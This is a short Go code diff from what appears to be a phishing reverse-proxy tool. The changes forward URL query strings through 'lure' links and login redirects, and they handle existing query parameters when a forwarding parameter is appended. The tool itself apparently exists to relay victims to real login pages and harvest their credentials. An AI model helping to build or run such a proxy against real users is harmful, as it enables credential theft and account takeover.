@@ -208,6 +208,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
+				lure_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
 			}
 
@@ -590,6 +591,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
+						if req.URL.RawQuery != "" {
+							if strings.ContainsRune(rurl, '?') {
+								rurl += "&" + req.URL.RawQuery
+							} else {
+								rurl += "?" + req.URL.RawQuery
+							}
+						}
 						u, err := url.Parse(rurl)
 						if err == nil {
 							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
@@ -1459,7 +1467,11 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	t[0] = crc
 	fwd_param := base64.RawURLEncoding.EncodeToString(t)
 
-	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
+	if strings.ContainsRune(lure_url, '?') {
+		lure_url += "&" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
+	} else {
+		lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
+	}
 
 	for k, v := range *params {
 		key := "{" + k + "}"
